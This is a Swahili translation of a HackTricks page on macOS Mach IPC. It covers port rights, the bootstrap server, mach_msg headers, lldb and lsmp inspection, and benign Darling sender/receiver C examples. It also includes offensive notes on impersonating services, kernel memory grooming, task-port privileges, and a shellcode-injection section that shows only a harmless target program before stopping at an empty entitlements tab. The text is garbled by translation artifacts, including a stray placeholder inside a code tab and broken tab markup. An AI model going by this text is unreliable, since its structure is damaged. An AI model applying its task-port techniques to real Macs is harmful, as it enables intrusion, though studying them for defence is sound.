# macOS IPC - Mawasiliano kati ya Michakato

<details>

<summary><strong>Jifunze AWS hacking kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA USAJILI**](https://github.com/sponsors/carlospolop)!
* Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa kipekee wa [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu zako za udukuzi kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>

## Ujumbe wa Mach kupitia Bandari

### Taarifa Msingi

Mach hutumia **kazi** kama **kitengo kidogo** cha kugawana rasilimali, na kila kazi inaweza kuwa na **vijiti vingi**. Hizi **kazi na vijiti zimepangwa 1:1 kwa michakato na vijiti vya POSIX**.

Mawasiliano kati ya kazi hufanyika kupitia Mawasiliano ya Michakato ya Mach (IPC), kwa kutumia njia za mawasiliano za njia moja. **Ujumbe hupitishwa kati ya bandari**, ambazo hufanya kama aina ya **fifirisho la ujumbe** linalosimamiwa na kernel.

**Bandari** ni **elementi msingi** ya Mach IPC. Inaweza kutumika kutuma ujumbe na kupokea.

Kila mchakato una **jedwali la IPC**, ambapo inawezekana kupata **bandari za mach za mchakato**. Jina la bandari ya mach ni kweli nambari (kielekezi kwa kitu cha kernel).

Mchakato pia unaweza kutuma jina la bandari na baadhi ya haki **kwa kazi tofauti** na kernel itafanya kuingia hii katika **jedwali la IPC la kazi nyingine** ionekane.

### Haki za Bandari

Haki za bandari, ambazo hufafanua ni operesheni gani kazi inaweza kufanya, ni muhimu katika mawasiliano haya. **Haki za bandari** zinaweza kuwa ([maelezo kutoka hapa](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)):

* **Haki ya Kupokea**, ambayo inaruhusu kupokea ujumbe uliotumwa kwa bandari. Bandari za Mach ni foleni za MPSC (wazalishaji wengi, mtumiaji mmoja), ambayo inamaanisha kwamba inaweza kuwepo **haki moja ya kupokea kwa kila bandari** katika mfumo mzima (tofauti na mabomba, ambapo michakato mingi inaweza kushikilia viashiria vya faili kwa mwisho wa kusoma wa bomba moja).
* **Kazi yenye Haki ya Kupokea** inaweza kupokea ujumbe na **kuunda Haki za Kutuma**, kuruhusu kutuma ujumbe. Awali, **kazi yenyewe ina Haki ya Kupokea juu ya bandari yake**.
* Ikiwa mmiliki wa Haki ya Kupokea **anakufa** au kuifuta, **haki ya kutuma inakuwa bure (jina lililokufa).**
* **Haki ya Kutuma**, ambayo inaruhusu kutuma ujumbe kwa bandari.
* Haki ya Kutuma inaweza **kufanyiwa nakala** ili kazi ikiwa na Haki ya Kutuma inaweza kufanya nakala ya haki hiyo na **kuipatia kazi ya tatu**.
* Kumbuka kwamba **haki za bandari** pia zinaweza **kupitishwa** kupitia ujumbe wa Mac.
* **Haki ya Kutuma mara moja**, ambayo inaruhusu kutuma ujumbe moja kwa bandari na kisha kutoweka.
* Haki hii **haiwezi** **kufanyiwa nakala**, lakini inaweza **kuhamishwa**.
* **Haki ya Seti ya Bandari**, ambayo inaashiria _seti ya bandari_ badala ya bandari moja. Kutoa ujumbe kutoka kwa seti ya bandari kunatoa ujumbe kutoka kwa moja ya bandari inayojumuisha. Seti za bandari zinaweza kutumika kusikiliza bandari kadhaa kwa wakati mmoja, kama `chagua`/`piga kura`/`epoll`/`kqueue` katika Unix.
* **Jina lililokufa**, ambalo sio haki halisi ya bandari, lakini ni nafasi tupu tu. Linapobomolewa bandari, haki zote za bandari zilizopo kwa bandari hiyo zinageuka kuwa majina yaliyokufa.

**Kazi zinaweza kusafirisha HAKI ZA KUTUMA kwa wengine**, kuwaruhusu kutuma ujumbe nyuma. **HAKI ZA KUTUMA pia zinaweza kufanyiwa nakala, hivyo kazi inaweza kuzidisha na kumpa haki ya tatu**. Hii, pamoja na mchakato wa kati unaojulikana kama **seva ya bootstrap**, inaruhusu mawasiliano yenye ufanisi kati ya kazi.

### Bandari za Faili

Bandari za faili huruhusu kufunga viashiria vya faili katika bandari za Mac (kwa kutumia Haki za Bandari za Mach). Inawezekana kuunda `fileport` kutoka kwa FD iliyopewa kutumia `fileport_makeport` na kuunda FD kutoka kwa fileport kutumia `fileport_makefd`.

### Kuweka Mawasiliano

Kama ilivyotajwa awali, inawezekana kutuma haki kutumia ujumbe wa Mach, hata hivyo, **hauwezi kutuma haki bila kuwa na haki ya kutuma ujumbe wa Mach**. Kwa hivyo, mawasiliano ya kwanza yanathibitishwaje?

Kwa hili, **seva ya bootstrap** (**launchd** kwenye mac) inahusika, kwani **kila mtu anaweza kupata HAKI YA KUTUMA kwa seva ya bootstrap**, inawezekana kuomba haki ya kutuma ujumbe kwa mchakato mwingine:

1. Kazi **A** inaunda **bandari mpya**, ikipata **HAKI YA KUPOKEA** juu yake.
2. Kazi **A**, ikiwa mmiliki wa HAKI YA KUPOKEA, **inazalisha HAKI YA KUTUMA kwa bandari**.
3. Kazi **A** inathibitisha **mawasiliano** na **seva ya bootstrap**, na **kuituma HAKI YA KUTUMA** kwa bandari iliyoizalisha mwanzoni.
* Kumbuka kwamba mtu yeyote anaweza kupata HAKI YA KUTUMA kwa seva ya bootstrap.
4. Kazi A inatuma ujumbe wa `bootstrap_register` kwa seva ya bootstrap ili **kuhusisha bandari iliyotolewa na jina** kama `com.apple.taska`
5. Kazi **B** inashirikiana na **seva ya bootstrap** kutekeleza utaftaji wa bootstrap kwa jina la huduma (`bootstrap_lookup`). Kwa hivyo seva ya bootstrap inaweza kujibu, kazi B itatuma **HAKI YA KUTUMA kwa bandari iliyoundwa hapo awali** ndani ya ujumbe wa utaftaji. Ikiwa utaftaji unafanikiwa, **seva inadua HAKI YA KUTUMA** iliyopokelewa kutoka kwa Kazi A na **kuipitisha kwa Kazi B**.
* Kumbuka kwamba mtu yeyote anaweza kupata HAKI YA KUTUMA kwa seva ya bootstrap.
6. Kwa HAKI YA KUTUMA hii, **Kazi B** inaweza **kutuma** **ujumbe** **kwa Kazi A**.
7. Kwa mawasiliano ya pande zote kawaida kazi **B** inazalisha bandari mpya na **HAKI YA KUPOKEA** na **HAKI YA KUTUMA**, na kumpa **HAKI YA KUTUMA kwa Kazi A** ili iweze kutuma ujumbe kwa KAZI B (mawasiliano ya pande zote).

Seva ya bootstrap **haiwezi kuthibitisha** jina la huduma lililodaiwa na kazi. Hii inamaanisha **kazi** inaweza kwa uwezekano **kujifanya kuwa kazi yoyote ya mfumo**, kama vile **kudai jina la huduma ya idhini** na kisha kuidhinisha kila ombi.

Kisha, Apple huhifadhi **majina ya huduma zilizotolewa na mfumo** katika faili za usanidi salama, zilizoko katika miongozo iliyolindwa na SIP: `/System/Library/LaunchDaemons` na `/System/Library/LaunchAgents`. Pamoja na kila jina la huduma, **binary inayohusiana pia imehifadhiwa**. Seva ya bootstrap, itaunda na kushikilia **HAKI YA KUPOKEA kwa kila moja ya majina haya ya huduma**.

Kwa huduma hizi zilizopangwa mapema, **mchakato wa utaftaji unatofautiana kidogo**. Wakati jina la huduma linatafutwa, launchd huanzisha huduma hiyo kwa muda. Mchakato mpya ni kama ifuatavyo:

* Kazi **B** inaanzisha utaftaji wa bootstrap kwa jina la huduma.
* **launchd** inachunguza ikiwa kazi inaendeshwa na ikiwa haiko, **inaianzisha**.
* Kazi **A** (huduma) inatekeleza **kuangalia bootstrap** (`bootstrap_check_in()`). Hapa, **seva ya bootstrap inaunda HAKI YA KUTUMA, inaishikilia, na **inapitisha HAKI YA KUPOKEA kwa Kazi A**.
* launchd inadua **HAKI YA KUTUMA na kuipitisha kwa Kazi B**.
* Kazi **B** inazalisha bandari mpya na **HAKI YA KUPOKEA** na **HAKI YA KUTUMA**, na kumpa **HAKI YA KUTUMA kwa Kazi A** (huduma) ili iweze kutuma ujumbe kwa KAZI B (mawasiliano ya pande zote).

Walakini, mchakato huu unatumika tu kwa kazi za mfumo zilizopangwa mapema. Kazi zisizo za mfumo bado zinaendesha kama ilivyoelezwa awali, ambayo inaweza kwa uwezekano kuruhusu udanganyifu.

{% hint style="hatari" %}
Kwa hivyo, launchd kamwe haipaswi kugonga au mfumo mzima utaanguka.
{% endhint %}
### Ujumbe wa Mach

[Pata habari zaidi hapa](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)

Kazi ya `mach_msg`, kimsingi ni wito wa mfumo, hutumiwa kutuma na kupokea ujumbe wa Mach. Kazi inahitaji ujumbe utumwe kama hoja ya awali. Ujumbe huu lazima uanze na muundo wa `mach_msg_header_t`, ukifuatiwa na maudhui ya ujumbe halisi. Muundo huo umedefiniwa kama ifuatavyo:
```c
typedef struct {
mach_msg_bits_t               msgh_bits;
mach_msg_size_t               msgh_size;
mach_port_t                   msgh_remote_port;
mach_port_t                   msgh_local_port;
mach_port_name_t              msgh_voucher_port;
mach_msg_id_t                 msgh_id;
} mach_msg_header_t;
```
Mchakato unaomiliki _**haki ya kupokea**_ unaweza kupokea ujumbe kwenye mlango wa Mach. Kinyume chake, **wapelekaji** hupewa _**haki ya kutuma**_ au _**haki ya kutuma mara moja**_. Haki ya kutuma mara moja ni kwa ajili ya kutuma ujumbe mmoja tu, baada ya hapo inakuwa batili.

Uga wa awali **`msgh_bits`** ni ramani ya biti:

- Biti ya kwanza (yenye maana zaidi) hutumika kuonyesha kuwa ujumbe ni mgumu (zaidi kuhusu hili chini)
- Ya 3 na 4 hutumiwa na kernel
- **Biti 5 zisizo na maana zaidi za byte ya 2** zinaweza kutumika kwa **voucher**: aina nyingine ya mlango kutuma jozi za thamani/ufunguo.
- **Biti 5 zisizo na maana zaidi za byte ya 3** zinaweza kutumika kwa **mlango wa ndani**
- **Biti 5 zisizo na maana zaidi za byte ya 4** zinaweza kutumika kwa **mlango wa mbali**

Aina zinazoweza kutajwa katika voucher, milango ya ndani na ya mbali ni (kutoka [**mach/message.h**](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html)):
```c
#define MACH_MSG_TYPE_MOVE_RECEIVE      16      /* Must hold receive right */
#define MACH_MSG_TYPE_MOVE_SEND         17      /* Must hold send right(s) */
#define MACH_MSG_TYPE_MOVE_SEND_ONCE    18      /* Must hold sendonce right */
#define MACH_MSG_TYPE_COPY_SEND         19      /* Must hold send right(s) */
#define MACH_MSG_TYPE_MAKE_SEND         20      /* Must hold receive right */
#define MACH_MSG_TYPE_MAKE_SEND_ONCE    21      /* Must hold receive right */
#define MACH_MSG_TYPE_COPY_RECEIVE      22      /* NOT VALID */
#define MACH_MSG_TYPE_DISPOSE_RECEIVE   24      /* must hold receive right */
#define MACH_MSG_TYPE_DISPOSE_SEND      25      /* must hold send right(s) */
#define MACH_MSG_TYPE_DISPOSE_SEND_ONCE 26      /* must hold sendonce right */
```
Kwa mfano, `MACH_MSG_TYPE_MAKE_SEND_ONCE` inaweza kutumika **kuashiria** kwamba **haki ya kutuma mara moja** inapaswa kuletwa na kuhamishiwa kwa ajili ya bandari hii. Inaweza pia kutajwa `MACH_PORT_NULL` ili kuzuia mpokeaji kuweza kujibu.

Ili kufikia **mawasiliano ya pande zote** kwa urahisi, mchakato unaweza kutaja **bandari ya mach** katika **kichwa cha ujumbe wa mach** kinachoitwa _bandari ya jibu_ (**`msgh_local_port`**) ambapo **mpokeaji** wa ujumbe anaweza **kutuma jibu** kwa ujumbe huu.

{% hint style="success" %}
Tafadhali elewa kwamba aina hii ya mawasiliano ya pande zote hutumiwa katika ujumbe wa XPC ambao unatarajia jibu (`xpc_connection_send_message_with_reply` na `xpc_connection_send_message_with_reply_sync`). Lakini **kawaida bandari tofauti huzalishwa** kama ilivyoelezwa hapo awali ili kuunda mawasiliano ya pande zote.
{% endhint %}

Vitengo vingine vya kichwa cha ujumbe ni:

- `msgh_size`: ukubwa wa pakiti nzima.
- `msgh_remote_port`: bandari ambayo ujumbe huu unatumwa.
- `msgh_voucher_port`: [vifungo vya mach](https://robert.sesek.com/2023/6/mach\_vouchers.html).
- `msgh_id`: kitambulisho cha ujumbe huu, ambacho huchambuliwa na mpokeaji.

{% hint style="danger" %}
Tafadhali elewa kwamba **ujumbe wa mach hutumwa juu ya `bandari ya mach`**, ambayo ni njia ya mawasiliano ya **mpokeaji mmoja**, **watumaji wengi** iliyojengwa ndani ya kiini cha mach. **Michakato mingi** inaweza **kutuma ujumbe** kwa bandari ya mach, lakini wakati wowote tu **mchakato mmoja unaweza kusoma** kutoka kwake.
{% endhint %}

Ujumbe kisha hufanywa na kichwa cha **`mach_msg_header_t`** kifuatiwa na **mwili** na na **trailer** (ikiwa ipo) na inaweza kutoa idhini ya kujibu. Katika kesi hizi, kiini kinahitaji tu kusafirisha ujumbe kutoka kazi moja hadi nyingine.

**Trailer** ni **taarifa zilizoongezwa kwenye ujumbe na kiini** (haiwezi kuwekwa na mtumiaji) ambayo inaweza kuhitajika wakati wa kupokea ujumbe kwa kutumia bendera `MACH_RCV_TRAILER_<trailer_opt>` (kuna taarifa tofauti zinazoweza kuhitajika).

#### Ujumbe Wenye Utata

Hata hivyo, kuna ujumbe mwingine zaidi **wenye utata**, kama vile wale wanaopitisha haki za bandari za ziada au kugawana kumbukumbu, ambapo kiini pia kinahitaji kutuma vitu hivi kwa mpokeaji. Katika kesi hizi, biti muhimu zaidi ya kichwa `msgh_bits` inawekwa.

Maelezo yanayowezekana ya kupitisha yanatambuliwa katika [**`mach/message.h`**](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html):
```c
#define MACH_MSG_PORT_DESCRIPTOR                0
#define MACH_MSG_OOL_DESCRIPTOR                 1
#define MACH_MSG_OOL_PORTS_DESCRIPTOR           2
#define MACH_MSG_OOL_VOLATILE_DESCRIPTOR        3
#define MACH_MSG_GUARDED_PORT_DESCRIPTOR        4

#pragma pack(push, 4)

typedef struct{
natural_t                     pad1;
mach_msg_size_t               pad2;
unsigned int                  pad3 : 24;
mach_msg_descriptor_type_t    type : 8;
} mach_msg_type_descriptor_t;
```
Katika bits 32, maelezo yote ni 12B na aina ya maelezo iko katika ya 11. Katika bits 64, saizi hutofautiana.

{% hint style="danger" %}
Kernel itakopy maelezo kutoka kwa kazi moja hadi nyingine lakini kwanza **kutengeneza nakala katika kumbukumbu ya kernel**. Mbinu hii, inayojulikana kama "Feng Shui" imekuwa ikitumiwa vibaya katika mianya kadhaa kufanya **kernel ikope data katika kumbukumbu yake** ikifanya mchakato kutuma maelezo kwake mwenyewe. Kisha mchakato unaweza kupokea ujumbe (kernel itawafuta).

Pia niwezekanavyo **kutuma haki za bandari kwa mchakato dhaifu**, na haki za bandari zitaonekana tu kwenye mchakato (hata kama hachakazi nazo).
{% endhint %}

### Viungo vya Mac Ports

Tafadhali kumbuka kuwa bandari zinaunganishwa na jina la kazi, kwa hivyo ili kuunda au kutafuta bandari, jina la kazi pia linahitajika (zaidi katika `mach/mach_port.h`):

* **`mach_port_allocate` | `mach_port_construct`**: **Unda** bandari.
* `mach_port_allocate` inaweza pia kuunda **seti ya bandari**: haki ya kupokea juu ya kikundi cha bandari. Kila wakati ujumbe unapopokelewa inaonyeshwa bandari kutoka ambapo ulitumwa.
* `mach_port_allocate_name`: Badilisha jina la bandari (kwa chaguo msingi nambari ya 32bit)
* `mach_port_names`: Pata majina ya bandari kutoka kwa lengo
* `mach_port_type`: Pata haki za kazi juu ya jina
* `mach_port_rename`: Badilisha jina la bandari (kama dup2 kwa FDs)
* `mach_port_allocate`: Tenga kupokea mpya, PORT\_SET au DEAD\_NAME
* `mach_port_insert_right`: Unda haki mpya katika bandari ambapo una PATA
* `mach_port_...`
* **`mach_msg`** | **`mach_msg_overwrite`**: Vifaa vinavyotumiwa kutuma na kupokea ujumbe wa mach. Toleo la kubadilisha linaruhusu kutaja buffer tofauti kwa kupokea ujumbe (toleo lingine litaitumia tena).

### Machaguo ya mach\_msg

Kwa kuwa kazi **`mach_msg`** na **`mach_msg_overwrite`** ndizo hutumiwa kutuma na kupokea ujumbe, kuweka kizuizi juu yao kunaruhusu kuangalia ujumbe uliotumwa na ule uliopokelewa.

Kwa mfano, anza kudebugi programu yoyote unayoweza kudebugi kwani itapakia **`libSystem.B` ambayo itatumia kazi hii**.

<pre class="language-armasm"><code class="lang-armasm"><strong>(lldb) b mach_msg
</strong>Breakpoint 1: where = libsystem_kernel.dylib`mach_msg, address = 0x00000001803f6c20
<strong>(lldb) r
</strong>Process 71019 launched: '/Users/carlospolop/Desktop/sandboxedapp/SandboxedShellAppDown.app/Contents/MacOS/SandboxedShellApp' (arm64)
Process 71019 stopped
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
frame #0: 0x0000000181d3ac20 libsystem_kernel.dylib`mach_msg
libsystem_kernel.dylib`mach_msg:
->  0x181d3ac20 &#x3C;+0>:  pacibsp
0x181d3ac24 &#x3C;+4>:  sub    sp, sp, #0x20
0x181d3ac28 &#x3C;+8>:  stp    x29, x30, [sp, #0x10]
0x181d3ac2c &#x3C;+12>: add    x29, sp, #0x10
Target 0: (SandboxedShellApp) stopped.
<strong>(lldb) bt
</strong>* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
* frame #0: 0x0000000181d3ac20 libsystem_kernel.dylib`mach_msg
frame #1: 0x0000000181ac3454 libxpc.dylib`_xpc_pipe_mach_msg + 56
frame #2: 0x0000000181ac2c8c libxpc.dylib`_xpc_pipe_routine + 388
frame #3: 0x0000000181a9a710 libxpc.dylib`_xpc_interface_routine + 208
frame #4: 0x0000000181abbe24 libxpc.dylib`_xpc_init_pid_domain + 348
frame #5: 0x0000000181abb398 libxpc.dylib`_xpc_uncork_pid_domain_locked + 76
frame #6: 0x0000000181abbbfc libxpc.dylib`_xpc_early_init + 92
frame #7: 0x0000000181a9583c libxpc.dylib`_libxpc_initializer + 1104
frame #8: 0x000000018e59e6ac libSystem.B.dylib`libSystem_initializer + 236
frame #9: 0x0000000181a1d5c8 dyld`invocation function for block in dyld4::Loader::findAndRunAllInitializers(dyld4::RuntimeState&#x26;) const::$_0::operator()() const + 168
</code></pre>

Ili kupata hoja za **`mach_msg`** angalia rejista. Hizi ndizo hoja (kutoka [mach/message.h](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html)):
```c
__WATCHOS_PROHIBITED __TVOS_PROHIBITED
extern mach_msg_return_t        mach_msg(
mach_msg_header_t *msg,
mach_msg_option_t option,
mach_msg_size_t send_size,
mach_msg_size_t rcv_size,
mach_port_name_t rcv_name,
mach_msg_timeout_t timeout,
mach_port_name_t notify);
```
Pata thamani kutoka kwenye rejisti:
```armasm
reg read $x0 $x1 $x2 $x3 $x4 $x5 $x6
x0 = 0x0000000124e04ce8 ;mach_msg_header_t (*msg)
x1 = 0x0000000003114207 ;mach_msg_option_t (option)
x2 = 0x0000000000000388 ;mach_msg_size_t (send_size)
x3 = 0x0000000000000388 ;mach_msg_size_t (rcv_size)
x4 = 0x0000000000001f03 ;mach_port_name_t (rcv_name)
x5 = 0x0000000000000000 ;mach_msg_timeout_t (timeout)
x6 = 0x0000000000000000 ;mach_port_name_t (notify)
```
Chunguza kichwa cha ujumbe ukichunguza hoja ya kwanza:
```armasm
(lldb) x/6w $x0
0x124e04ce8: 0x00131513 0x00000388 0x00000807 0x00001f03
0x124e04cf8: 0x00000b07 0x40000322

; 0x00131513 -> mach_msg_bits_t (msgh_bits) = 0x13 (MACH_MSG_TYPE_COPY_SEND) in local | 0x1500 (MACH_MSG_TYPE_MAKE_SEND_ONCE) in remote | 0x130000 (MACH_MSG_TYPE_COPY_SEND) in voucher
; 0x00000388 -> mach_msg_size_t (msgh_size)
; 0x00000807 -> mach_port_t (msgh_remote_port)
; 0x00001f03 -> mach_port_t (msgh_local_port)
; 0x00000b07 -> mach_port_name_t (msgh_voucher_port)
; 0x40000322 -> mach_msg_id_t (msgh_id)
```
Aina hiyo ya `mach_msg_bits_t` ni ya kawaida sana kuruhusu jibu.



### Piga namba milango
```bash
lsmp -p <pid>

sudo lsmp -p 1
Process (1) : launchd
name      ipc-object    rights     flags   boost  reqs  recv  send sonce oref  qlimit  msgcount  context            identifier  type
---------   ----------  ----------  -------- -----  ---- ----- ----- ----- ----  ------  --------  ------------------ ----------- ------------
0x00000203  0x181c4e1d  send        --------        ---            2                                                  0x00000000  TASK-CONTROL SELF (1) launchd
0x00000303  0x183f1f8d  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x00000403  0x183eb9dd  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x0000051b  0x1840cf3d  send        --------        ---            2        ->        6         0  0x0000000000000000 0x00011817  (380) WindowServer
0x00000603  0x183f698d  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x0000070b  0x175915fd  recv,send   ---GS---     0  ---      1     2         Y        5         0  0x0000000000000000
0x00000803  0x1758794d  send        --------        ---            1                                                  0x00000000  CLOCK
0x0000091b  0x192c71fd  send        --------        D--            1        ->        1         0  0x0000000000000000 0x00028da7  (418) runningboardd
0x00000a6b  0x1d4a18cd  send        --------        ---            2        ->       16         0  0x0000000000000000 0x00006a03  (92247) Dock
0x00000b03  0x175a5d4d  send        --------        ---            2        ->       16         0  0x0000000000000000 0x00001803  (310) logd
[...]
0x000016a7  0x192c743d  recv,send   --TGSI--     0  ---      1     1         Y       16         0  0x0000000000000000
+     send        --------        ---            1         <-                                       0x00002d03  (81948) seserviced
+     send        --------        ---            1         <-                                       0x00002603  (74295) passd
[...]
```
**Jina** ni jina la chaguo-msingi linalopewa mlango (angalia jinsi inavyoongezeka katika herufi 3 za kwanza). **`ipc-object`** ni **kitambulisho** cha kipekee kilichofichwa cha mlango.\
Pia kumbuka jinsi milango yenye haki za kutuma pekee inavyo **tambulisha mmiliki** wake (jina la mlango + pid).\
Pia kumbuka matumizi ya **`+`** kuonyesha **kazi nyingine zilizounganishwa na mlango huo huo**.

Pia ni rahisi kutumia [**procesxp**](https://www.newosxbook.com/tools/procexp.html) kuona pia **majina ya huduma zilizosajiliwa** (ikiwa SIP imelemazwa kutokana na hitaji la `com.apple.system-task-port`):
```
procesp 1 ports
```
Unaweza kusakinisha zana hii kwenye iOS kwa kuipakua kutoka [http://newosxbook.com/tools/binpack64-256.tar.gz](http://newosxbook.com/tools/binpack64-256.tar.gz)

### Mfano wa Kanuni

Tafadhali angalia jinsi **mtumaji** anavyo **tenga** bandari, anajenga **haki ya kutuma** kwa jina `org.darlinghq.example` na kuituma kwa **seva ya bootstrap** wakati mtumaji alipoomba **haki ya kutuma** ya jina hilo na kuitumia kutuma **ujumbe**.

{% tabs %}
{% tab title="receiver.c" %}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc receiver.c -o receiver

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Create a new port.
mach_port_t port;
kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
if (kr != KERN_SUCCESS) {
printf("mach_port_allocate() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_allocate() created port right name %d\n", port);


// Give us a send right to this port, in addition to the receive right.
kr = mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
if (kr != KERN_SUCCESS) {
printf("mach_port_insert_right() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_insert_right() inserted a send right\n");


// Send the send right to the bootstrap server, so that it can be looked up by other processes.
kr = bootstrap_register(bootstrap_port, "org.darlinghq.example", port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_register() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_register()'ed our port\n");


// Wait for a message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
mach_msg_trailer_t trailer;
} message;

kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_RCV_MSG,     // Options. We're receiving a message.
0,                // Size of the message being sent, if sending.
sizeof(message),  // Size of the buffer for receiving.
port,             // The port to receive a message on.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Got a message\n");

message.some_text[9] = 0;
printf("Text: %s, number: %d\n", message.some_text, message.some_number);
}
```
{% endtab %}

{% tab title="sender.c" %}  
### Swahili Translation
```plaintext
Hakuna mabadiliko yanayohitajika kwenye faili hii.
```  
{% endtab %}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc sender.c -o sender

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Lookup the receiver port using the bootstrap server.
mach_port_t port;
kern_return_t kr = bootstrap_look_up(bootstrap_port, "org.darlinghq.example", &port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_look_up() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_look_up() returned port right name %d\n", port);


// Construct our message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
} message;

message.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
message.header.msgh_remote_port = port;
message.header.msgh_local_port = MACH_PORT_NULL;

strncpy(message.some_text, "Hello", sizeof(message.some_text));
message.some_number = 35;

// Send the message.
kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_SEND_MSG,    // Options. We're sending a message.
sizeof(message),  // Size of the message being sent.
0,                // Size of the buffer for receiving.
MACH_PORT_NULL,   // A port to receive a message on, if receiving.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Sent a message\n");
}
```
{% endtab %}
{% endtabs %}

### Bandari za Haki

* **Bandari ya Mwenyeji**: Ikiwa mchakato una **ruhusa ya Kutuma** juu ya bandari hii anaweza kupata **habari** kuhusu **mfumo** (k.m. `host_processor_info`).
* **Bandari ya Haki ya Mwenyeji**: Mchakato wenye **Haki ya Kutuma** juu ya bandari hii anaweza kutekeleza **vitendo vya haki** kama vile kupakia kifurushi cha kernel. **Mchakato unahitaji kuwa na mizizi** kupata idhini hii.
* Zaidi ya hayo, ili kuita API ya **`kext_request`** ni lazima kuwa na ruhusa nyingine za **`com.apple.private.kext*`** ambazo hupewa tu programu za Apple.
* **Bandari ya Jina la Kazi:** Toleo lisiloruhusiwa la _bandari ya kazi_. Inahusisha kazi, lakini haimruhusu kuidhibiti. Kitu pekee kinachoonekana kupatikana kupitia hii ni `task_info()`.
* **Bandari ya Kazi** (inayoitwa pia bandari ya kernel)**:** Ikiwa una ruhusa ya Kutuma juu ya bandari hii ni rahisi kudhibiti kazi (kusoma/kuandika kumbukumbu, kuunda nyuzi...).
* Piga simu `mach_task_self()` ili **pate jina** kwa bandari hii kwa kazi ya mpigaji. Bandari hii inarithiwa tu wakati wa **`exec()`**; kazi mpya iliyoanzishwa na `fork()` hupata bandari mpya ya kazi (kama kesi maalum, kazi pia hupata bandari mpya ya kazi baada ya `exec()` katika binary ya suid). Njia pekee ya kuzalisha kazi na kupata bandari yake ni kutekeleza ["ngoma ya kubadilisha bandari"](https://robert.sesek.com/2014/1/changes\_to\_xnu\_mach\_ipc.html) wakati wa kufanya `fork()`.
* Hizi ni vizuizi vya kupata bandari (kutoka `macos_task_policy` kutoka kwa binary ya `AppleMobileFileIntegrity`):
* Ikiwa programu ina **ruhusa ya `com.apple.security.get-task-allow`** mchakato kutoka kwa **mtumiaji huyo anaweza kupata bandari ya kazi** (kawaida huongezwa na Xcode kwa ajili ya kurekebisha makosa). Mchakato wa **kuidhinisha** hautaruhusu hii kwa matoleo ya uzalishaji.
* Programu zenye **ruhusa ya `com.apple.system-task-ports`** wanaweza kupata **bandari ya kazi kwa mchakato wowote**, isipokuwa kernel. Katika toleo za zamani ilikuwa inaitwa **`task_for_pid-allow`**. Hii inatolewa tu kwa programu za Apple.
* **Mizizi inaweza kupata bandari za kazi** za programu **zisizotengenezwa** na kukimbia na **mazingira salama** (na sio kutoka Apple).

### Uingizaji wa Shellcode katika nyuzi kupitia Bandari ya Kazi

Unaweza kupata shellcode kutoka:

{% content-ref url="../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md" %}
[arm64-basic-assembly.md](../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md)
{% endcontent-ref %}
```objectivec
// clang -framework Foundation mysleep.m -o mysleep
// codesign --entitlements entitlements.plist -s - mysleep

#import <Foundation/Foundation.h>

double performMathOperations() {
double result = 0;
for (int i = 0; i < 10000; i++) {
result += sqrt(i) * tan(i) - cos(i);
}
return result;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
NSLog(@"Process ID: %d", [[NSProcessInfo processInfo]
processIdentifier]);
while (true) {
[NSThread sleepForTimeInterval:5];

performMathOperations();  // Silent action

[NSThread sleepForTimeInterval:5];
}
}
return 0;
}
```
{% endtab %}

{% tab title="entitlements.plist" %} 
### Maelezo

